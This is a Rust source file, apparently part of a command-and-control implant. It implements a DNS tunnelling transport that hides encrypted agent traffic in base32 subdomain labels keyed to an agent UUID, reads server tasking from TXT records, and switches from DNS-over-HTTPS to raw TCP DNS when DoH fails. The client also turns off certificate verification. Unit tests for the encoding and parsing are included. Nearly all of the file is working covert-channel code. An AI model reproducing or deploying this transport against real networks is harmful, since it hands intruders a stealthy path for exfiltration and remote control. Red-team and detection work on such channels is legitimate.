/// Hybrid DoH/DNS transport.
///
/// Automatically negotiates the best DNS-based protocol:
///   1. First `send()` tries DNS-over-HTTPS (DoH) via HTTPS POST.
///   2. If DoH fails (connection error, HTTP error), falls back to raw
///      DNS TXT queries over TCP.
///   3. If the DoH server comes back online, future calls retry DoH.
///
/// # Wire format
///
/// The JWE ciphertext is base32-encoded (NoPadding, uppercase) and split
/// into subdomain labels.  The DNS query name is:
///
///   `<label1>.<label2>...<agentHex>.<domain>.`
///
/// Where `agentHex` is the agent UUID without dashes (32 hex chars).
///
/// The server decodes the subdomains, passes the payload to the message
/// service, and returns the response as base64-encoded TXT records
/// (255-byte chunks).
///
/// # Payload size constraint
///
/// DNS labels are max 63 bytes each, total name max 253 bytes.
/// After accounting for domain, agent hex, and dots, the max payload
/// per query is ~140 bytes of raw data (base32 expands 5:8).
/// Larger payloads are split across multiple sequential queries.

use std::net::TcpStream;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;

use reqwest::blocking::Client;
use uuid::Uuid;

use crate::transport::Transporter;

pub struct DnsTransport {
    doh_url:      String,             // e.g. "https://127.0.0.1:8443/dns-query"
    dns_server:   String,             // e.g. "127.0.0.1:5353" (raw DNS TCP fallback)
    domain:       String,             // e.g. "fox3.local"
    agent_hex:    String,             // UUID without dashes, 32 hex chars
    http_client:  Client,             // reqwest for DoH HTTPS POST
    doh_failed:   AtomicBool,         // true if DoH failed -> fallback to raw DNS
    dns_tcp_conn: Mutex<Option<TcpStream>>,  // cached TCP connection for raw DNS
}

impl DnsTransport {
    pub fn new(
        doh_url: String,
        dns_server: String,
        domain: String,
        agent_id: Uuid,
    ) -> anyhow::Result<Self> {
        let http_client = Client::builder()
            .danger_accept_invalid_certs(true)
            .build()?;

        // Agent hex: UUID without dashes, lowercase
        let agent_hex = agent_id.as_simple().to_string();

        Ok(Self {
            doh_url,
            dns_server,
            domain,
            agent_hex,
            http_client,
            doh_failed: AtomicBool::new(false),
            dns_tcp_conn: Mutex::new(None),
        })
    }

    /// Send a DNS query via DoH (HTTPS POST with application/dns-message).
    fn doh_send(&self, dns_wire: &[u8]) -> anyhow::Result<Vec<u8>> {
        let resp = self.http_client
            .post(&self.doh_url)
            .header("Content-Type", "application/dns-message")
            .header("Accept", "application/dns-message")
            .body(dns_wire.to_vec())
            .send()?;

        let status = resp.status();
        let body = resp.bytes()?.to_vec();

        if !status.is_success() {
            anyhow::bail!("doh: server returned {}", status);
        }
        Ok(body)
    }

    /// Send a DNS query via raw TCP (RFC 1035: 2-byte BE length prefix).
    /// Reuses a cached TCP connection; reconnects on error.
    fn dns_tcp_send(&self, dns_wire: &[u8]) -> anyhow::Result<Vec<u8>> {
        use std::time::Duration;

        let mut guard = self.dns_tcp_conn.lock().map_err(|e| anyhow::anyhow!("lock: {}", e))?;

        // Try the cached connection first
        if let Some(ref mut stream) = *guard {
            match Self::dns_tcp_exchange(stream, dns_wire) {
                Ok(resp) => return Ok(resp),
                Err(_) => {
                    // Connection stale — drop and reconnect below
                    *guard = None;
                }
            }
        }

        // Open new connection
        let mut stream = TcpStream::connect(&self.dns_server)
            .map_err(|e| anyhow::anyhow!("dns-tcp: connect to {}: {}", self.dns_server, e))?;
        stream.set_read_timeout(Some(Duration::from_secs(30)))?;
        stream.set_write_timeout(Some(Duration::from_secs(10)))?;

        let resp = Self::dns_tcp_exchange(&mut stream, dns_wire)?;

        // Cache the connection for reuse
        *guard = Some(stream);
        Ok(resp)
    }

    /// Send one DNS query and read one response on an existing TCP stream.
    fn dns_tcp_exchange(stream: &mut TcpStream, dns_wire: &[u8]) -> anyhow::Result<Vec<u8>> {
        use std::io::{Read, Write};

        // TCP DNS framing: 2-byte big-endian length prefix
        let len = (dns_wire.len() as u16).to_be_bytes();
        stream.write_all(&len)?;
        stream.write_all(dns_wire)?;

        // Read response: 2-byte length + message
        let mut len_buf = [0u8; 2];
        stream.read_exact(&mut len_buf)?;
        let resp_len = u16::from_be_bytes(len_buf) as usize;
        let mut resp = vec![0u8; resp_len];
        stream.read_exact(&mut resp)?;

        Ok(resp)
    }
}

impl Transporter for DnsTransport {
    fn send(&self, _auth: &str, body: Vec<u8>) -> anyhow::Result<Vec<u8>> {
        // Encode the JWE ciphertext into DNS subdomain labels.
        // Large payloads are split across multiple queries.
        let chunks = split_payload(&body, &self.agent_hex, &self.domain);

        let mut last_response_data = Vec::new();

        for (i, dns_wire) in chunks.iter().enumerate() {
            // Re-read flag each iteration so DoH is skipped for remaining
            // chunks once the first failure sets it.
            let doh_failed = self.doh_failed.load(Ordering::Relaxed);

            let resp_wire = if !doh_failed {
                match self.doh_send(dns_wire) {
                    Ok(r) => r,
                    Err(e) => {
                        crate::dbg_print!("[transport] DoH failed ({}), falling back to raw DNS", e);
                        self.doh_failed.store(true, Ordering::Relaxed);
                        self.dns_tcp_send(dns_wire)?
                    }
                }
            } else {
                self.dns_tcp_send(dns_wire)?
            };

            if i == chunks.len() - 1 {
                // Last chunk: parse the full response (contains server data)
                last_response_data = parse_dns_response(&resp_wire)?;
            } else {
                // Intermediate chunk: verify the ACK is not an error
                check_dns_rcode(&resp_wire)?;
            }
        }

        Ok(last_response_data)
    }

    fn kind(&self) -> &'static str {
        if self.doh_failed.load(Ordering::Relaxed) { "dns" } else { "doh" }
    }
}

// ── DNS wire format helpers ──────────────────────────────────────────────────

/// Maximum payload bytes per DNS query.
///
/// DNS name max = 253 bytes.  We need room for:
///   - domain labels (e.g., "fox3.local." = 12 bytes including dots and length bytes)
///   - agent hex label (32 chars + 1 length byte + 1 dot = 34)
///   - remaining for data labels: 253 - 12 - 34 = ~207 bytes of encoded name
///   - Each label: 1 length byte + up to 63 data chars, so ~3 labels = ~189 base32 chars
///   - base32 encodes 5 bits per char → 189 chars = 189*5/8 = ~118 raw bytes
///
/// With 3 labels of 63 chars each (189 base32 chars + 3 length bytes = 192 wire bytes),
/// 189 base32 chars decode to 189*5/8 = 118 raw bytes. Rounded to 120.
const MAX_PAYLOAD_PER_QUERY: usize = 120;

/// Split a payload into one or more DNS wire-format queries.
/// Each query encodes up to MAX_PAYLOAD_PER_QUERY bytes of raw data.
///
/// When the payload requires multiple queries, each query's QNAME is
/// prefixed with a chunk marker label `m<seq_hex2><total_hex2>` so the
/// server can reassemble them in order.  Single-query payloads omit the
/// marker for backward compatibility.
fn split_payload(payload: &[u8], agent_hex: &str, domain: &str) -> Vec<Vec<u8>> {
    if payload.is_empty() {
        // Even empty payloads need one query (checkin with no data)
        let qname = build_qname(&[], agent_hex, domain, None);
        return vec![build_dns_query_wire(&qname)];
    }

    let total_chunks = (payload.len() + MAX_PAYLOAD_PER_QUERY - 1) / MAX_PAYLOAD_PER_QUERY;

    let mut queries = Vec::new();
    let mut offset = 0;

    for seq in 0..total_chunks {
        let end = (offset + MAX_PAYLOAD_PER_QUERY).min(payload.len());
        let chunk = &payload[offset..end];

        // Only add chunk markers when payload spans multiple queries
        let marker = if total_chunks > 1 {
            Some((seq, total_chunks))
        } else {
            None
        };

        let qname = build_qname(chunk, agent_hex, domain, marker);
        queries.push(build_dns_query_wire(&qname));
        offset = end;
    }

    queries
}

/// Build the full DNS query name from a payload chunk.
///
/// Format (single query):  `<label1>.<label2>...<agentHex>.<domain>`
/// Format (chunked):       `m<seq><tot>.<label1>.<label2>...<agentHex>.<domain>`
///
/// `chunk_marker` is `Some((seq, total))` when the payload spans multiple
/// queries.  The marker label is 5 lowercase chars: `m` + 2 hex digits for
/// the sequence number + 2 hex digits for the total count.
///
/// The payload is base32-encoded (NoPadding, uppercase) and split into
/// labels of max 63 characters each.
fn build_qname(payload: &[u8], agent_hex: &str, domain: &str, chunk_marker: Option<(usize, usize)>) -> String {
    let encoded = base32_encode(payload);

    let mut parts: Vec<String> = Vec::new();

    // Prepend chunk marker if this is a multi-query message
    if let Some((seq, total)) = chunk_marker {
        parts.push(format!("m{:02x}{:02x}", seq, total));
    }

    // Split base32 string into labels of max 63 chars
    let mut pos = 0;
    while pos < encoded.len() {
        let end = (pos + 63).min(encoded.len());
        parts.push(encoded[pos..end].to_string());
        pos = end;
    }

    if parts.is_empty() {
        // No data and no chunk marker — just agent ID + domain
        // Use a single "A" label as a placeholder to satisfy the 2-part minimum
        format!("A.{}.{}", agent_hex, domain)
    } else {
        // data/marker labels + agent hex + domain
        let data = parts.join(".");
        format!("{}.{}.{}", data, agent_hex, domain)
    }
}

/// Build a DNS wire-format TXT query.
fn build_dns_query_wire(qname: &str) -> Vec<u8> {
    let mut buf = Vec::with_capacity(512);

    // Header (12 bytes)
    let id: u16 = rand::random();
    buf.extend_from_slice(&id.to_be_bytes());       // Transaction ID
    buf.extend_from_slice(&0x0100u16.to_be_bytes()); // Flags: standard query, RD=1
    buf.extend_from_slice(&1u16.to_be_bytes());      // QDCOUNT = 1
    buf.extend_from_slice(&0u16.to_be_bytes());      // ANCOUNT = 0
    buf.extend_from_slice(&0u16.to_be_bytes());      // NSCOUNT = 0
    buf.extend_from_slice(&0u16.to_be_bytes());      // ARCOUNT = 0

    // Question section
    encode_qname_wire(qname, &mut buf);
    buf.extend_from_slice(&16u16.to_be_bytes());     // QTYPE = TXT (16)
    buf.extend_from_slice(&1u16.to_be_bytes());      // QCLASS = IN (1)

    buf
}

/// Encode a domain name into DNS wire format (length-prefixed labels).
fn encode_qname_wire(name: &str, buf: &mut Vec<u8>) {
    let name = name.trim_end_matches('.');
    for label in name.split('.') {
        let len = label.len();
        if len > 63 {
            // Shouldn't happen if we built the qname correctly
            buf.push(63);
            buf.extend_from_slice(&label.as_bytes()[..63]);
        } else {
            buf.push(len as u8);
            buf.extend_from_slice(label.as_bytes());
        }
    }
    buf.push(0); // Root label
}

/// Check RCODE of a DNS response; bail on error.
/// Used to validate intermediate chunk ACKs.
fn check_dns_rcode(wire: &[u8]) -> anyhow::Result<()> {
    if wire.len() < 12 {
        anyhow::bail!("dns: ack response too short ({} bytes)", wire.len());
    }
    let flags = u16::from_be_bytes([wire[2], wire[3]]);
    let rcode = flags & 0x000F;
    if rcode != 0 {
        anyhow::bail!("dns: server returned RCODE {} for intermediate chunk", rcode);
    }
    Ok(())
}

/// Parse a DNS wire-format response and extract TXT record data.
///
/// TXT records contain base64-encoded chunks (255-byte strings).
/// We concatenate all TXT strings, base64-decode, and return the raw bytes.
fn parse_dns_response(wire: &[u8]) -> anyhow::Result<Vec<u8>> {
    if wire.len() < 12 {
        anyhow::bail!("dns: response too short ({} bytes)", wire.len());
    }

    // Check RCODE
    let flags = u16::from_be_bytes([wire[2], wire[3]]);
    let rcode = flags & 0x000F;
    if rcode != 0 {
        // RCODE != NOERROR — server couldn't process our query
        anyhow::bail!("dns: server returned RCODE {}", rcode);
    }

    let ancount = u16::from_be_bytes([wire[6], wire[7]]) as usize;

    if ancount == 0 {
        // No answers — could be empty response (idle checkin)
        return Ok(Vec::new());
    }

    // Skip the question section
    let mut pos = 12;
    let qdcount = u16::from_be_bytes([wire[4], wire[5]]) as usize;
    for _ in 0..qdcount {
        pos = skip_name(wire, pos)?;
        pos += 4; // QTYPE + QCLASS
    }

    // Parse answer records
    let mut txt_data = String::new();

    for _ in 0..ancount {
        if pos >= wire.len() { break; }

        // Skip name (may be compressed)
        pos = skip_name(wire, pos)?;

        if pos + 10 > wire.len() {
            anyhow::bail!("dns: truncated answer record");
        }

        let rtype = u16::from_be_bytes([wire[pos], wire[pos + 1]]);
        // rclass at pos+2..pos+4
        // ttl at pos+4..pos+8
        let rdlength = u16::from_be_bytes([wire[pos + 8], wire[pos + 9]]) as usize;
        pos += 10;

        if rtype == 16 {
            // TXT record: one or more length-prefixed strings
            let end = pos + rdlength;
            while pos < end && pos < wire.len() {
                let slen = wire[pos] as usize;
                pos += 1;
                if pos + slen > wire.len() { break; }
                txt_data.push_str(std::str::from_utf8(&wire[pos..pos + slen]).unwrap_or(""));
                pos += slen;
            }
        } else {
            // Skip non-TXT records
            pos += rdlength;
        }
    }

    if txt_data.is_empty() {
        return Ok(Vec::new());
    }

    // Decode base64
    use base64::Engine as _;
    let decoded = base64::engine::general_purpose::STANDARD.decode(&txt_data)
        .map_err(|e| anyhow::anyhow!("dns: base64 decode error: {}", e))?;

    Ok(decoded)
}

/// Skip a DNS name in wire format (handles compression pointers).
fn skip_name(wire: &[u8], mut pos: usize) -> anyhow::Result<usize> {
    loop {
        if pos >= wire.len() {
            anyhow::bail!("dns: truncated name at offset {}", pos);
        }
        let len = wire[pos] as usize;
        if len == 0 {
            // Root label
            return Ok(pos + 1);
        }
        if len & 0xC0 == 0xC0 {
            // Compression pointer (2 bytes)
            return Ok(pos + 2);
        }
        pos += 1 + len;
    }
}

// ── Base32 encoding (RFC 4648, NoPadding, uppercase) ─────────────────────────

/// Standard base32 alphabet (RFC 4648).
const BASE32_ALPHABET: &[u8; 32] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

/// Encode bytes to base32 (uppercase, no padding).
///
/// Matches Go's `base32.StdEncoding.WithPadding(base32.NoPadding)`.
fn base32_encode(input: &[u8]) -> String {
    if input.is_empty() {
        return String::new();
    }

    let mut output = String::with_capacity((input.len() * 8 + 4) / 5);

    let mut buffer: u64 = 0;
    let mut bits: u32 = 0;

    for &byte in input {
        buffer = (buffer << 8) | byte as u64;
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            let idx = ((buffer >> bits) & 0x1F) as usize;
            output.push(BASE32_ALPHABET[idx] as char);
        }
    }

    // Remaining bits (if any)
    if bits > 0 {
        let idx = ((buffer << (5 - bits)) & 0x1F) as usize;
        output.push(BASE32_ALPHABET[idx] as char);
    }

    output
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base32_encode() {
        assert_eq!(base32_encode(b""), "");
        assert_eq!(base32_encode(b"f"), "MY");
        assert_eq!(base32_encode(b"fo"), "MZXQ");
        assert_eq!(base32_encode(b"foo"), "MZXW6");
        assert_eq!(base32_encode(b"foob"), "MZXW6YQ");
        assert_eq!(base32_encode(b"fooba"), "MZXW6YTB");
        assert_eq!(base32_encode(b"foobar"), "MZXW6YTBOI");
    }

    #[test]
    fn test_encode_qname_wire() {
        let mut buf = Vec::new();
        encode_qname_wire("foo.example.com", &mut buf);
        // Expected: 3foo7example3com0
        assert_eq!(buf[0], 3);
        assert_eq!(&buf[1..4], b"foo");
        assert_eq!(buf[4], 7);
        assert_eq!(&buf[5..12], b"example");
        assert_eq!(buf[12], 3);
        assert_eq!(&buf[13..16], b"com");
        assert_eq!(buf[16], 0);
    }

    #[test]
    fn test_build_qname_with_data() {
        let agent_hex = "0123456789abcdef0123456789abcdef";
        let domain = "fox3.local";
        let payload = b"hello";
        let qname = build_qname(payload, agent_hex, domain, None);
        // base32("hello") = "NBSWY3DP"
        assert!(qname.starts_with("NBSWY3DP."));
        assert!(qname.contains(agent_hex));
        assert!(qname.ends_with(domain));
    }

    #[test]
    fn test_build_qname_empty() {
        let agent_hex = "0123456789abcdef0123456789abcdef";
        let domain = "fox3.local";
        let qname = build_qname(&[], agent_hex, domain, None);
        // Empty payload uses "A" placeholder
        assert!(qname.starts_with("A."));
        assert!(qname.contains(agent_hex));
    }

    #[test]
    fn test_build_qname_chunked() {
        let agent_hex = "0123456789abcdef0123456789abcdef";
        let domain = "fox3.local";
        let payload = b"hello";
        let qname = build_qname(payload, agent_hex, domain, Some((0, 3)));
        // Should start with chunk marker m0003
        assert!(qname.starts_with("m0003."));
        // Then base32 data
        assert!(qname.contains("NBSWY3DP"));
        assert!(qname.contains(agent_hex));
        assert!(qname.ends_with(domain));
    }

    #[test]
    fn test_parse_dns_response_empty() {
        // Minimal DNS response: NOERROR, 0 answers
        let wire = vec![
            0x00, 0x01, // ID
            0x81, 0x80, // Flags: response, RD, RA
            0x00, 0x01, // QDCOUNT = 1
            0x00, 0x00, // ANCOUNT = 0
            0x00, 0x00, // NSCOUNT = 0
            0x00, 0x00, // ARCOUNT = 0
            // Question: "a.com" TXT IN
            0x01, b'a', 0x03, b'c', b'o', b'm', 0x00,
            0x00, 0x10, // TXT
            0x00, 0x01, // IN
        ];
        let result = parse_dns_response(&wire).unwrap();
        assert!(result.is_empty());
    }
}
